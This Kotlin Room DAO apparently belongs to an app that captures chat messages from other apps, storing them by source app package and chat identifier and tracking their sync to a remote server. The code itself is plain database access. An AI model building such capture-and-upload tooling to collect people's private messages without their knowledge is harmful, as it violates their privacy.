package com.chats.capture.database

import androidx.room.*
import com.chats.capture.models.ChatData
import kotlinx.coroutines.flow.Flow

@Dao
interface ChatDao {
    
    @Query("SELECT * FROM chats ORDER BY timestamp DESC")
    fun getAllChats(): Flow<List<ChatData>>
    
    @Query("SELECT * FROM chats WHERE synced = 0 ORDER BY timestamp ASC LIMIT :limit")
    suspend fun getUnsyncedChats(limit: Int = 50): List<ChatData>
    
    @Query("SELECT * FROM chats WHERE (synced = 0 OR lastSynced IS NULL OR lastSynced < :sinceTimestamp) AND timestamp >= :sinceTimestamp ORDER BY timestamp ASC LIMIT :limit")
    suspend fun getChatsSince(sinceTimestamp: Long, limit: Int = 50): List<ChatData>
    
    @Query("SELECT * FROM chats WHERE id = :id")
    suspend fun getChatById(id: String): ChatData?
    
    @Query("SELECT * FROM chats WHERE appPackage = :appPackage ORDER BY timestamp DESC")
    fun getChatsByApp(appPackage: String): Flow<List<ChatData>>
    
    @Query("SELECT * FROM chats WHERE chatIdentifier = :chatIdentifier ORDER BY timestamp ASC")
    fun getChatsByIdentifier(chatIdentifier: String): Flow<List<ChatData>>
    
    @Query("SELECT * FROM chats WHERE appPackage = :appPackage AND text = :text AND ABS(timestamp - :timestamp) < 5000")
    suspend fun findDuplicateChat(appPackage: String, text: String, timestamp: Long): ChatData?
    
    @Query("SELECT * FROM chats WHERE appPackage = :appPackage AND text = :text AND timestamp >= :minTimestamp AND timestamp <= :maxTimestamp LIMIT 1")
    suspend fun findChatByContent(appPackage: String, text: String, minTimestamp: Long, maxTimestamp: Long): ChatData?
    
    @Query("SELECT COUNT(*) FROM chats WHERE synced = 0")
    suspend fun getUnsyncedCount(): Int
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertChat(chat: ChatData)
    
    @Insert(onConflict = OnConflictStrategy.REPLACE)
    suspend fun insertChats(chats: List<ChatData>)
    
    @Update
    suspend fun updateChat(chat: ChatData)

    @Query("UPDATE chats SET iconUrl = :iconUrl WHERE id = :id")
    suspend fun updateIconUrl(id: String, iconUrl: String?)
    
    @Query("UPDATE chats SET synced = 1, syncAttempts = 0, errorMessage = NULL, lastSynced = :syncTime WHERE id = :id")
    suspend fun markAsSynced(id: String, syncTime: Long = System.currentTimeMillis())
    
    @Query("UPDATE chats SET syncAttempts = syncAttempts + 1, lastSyncAttempt = :timestamp, errorMessage = :error WHERE id = :id")
    suspend fun markSyncAttempt(id: String, timestamp: Long, error: String?)
    
    @Query("DELETE FROM chats WHERE synced = 1 AND timestamp < :beforeTimestamp")
    suspend fun deleteOldSyncedChats(beforeTimestamp: Long)
    
    @Query("DELETE FROM chats WHERE id = :id")
    suspend fun deleteChat(id: String)
}
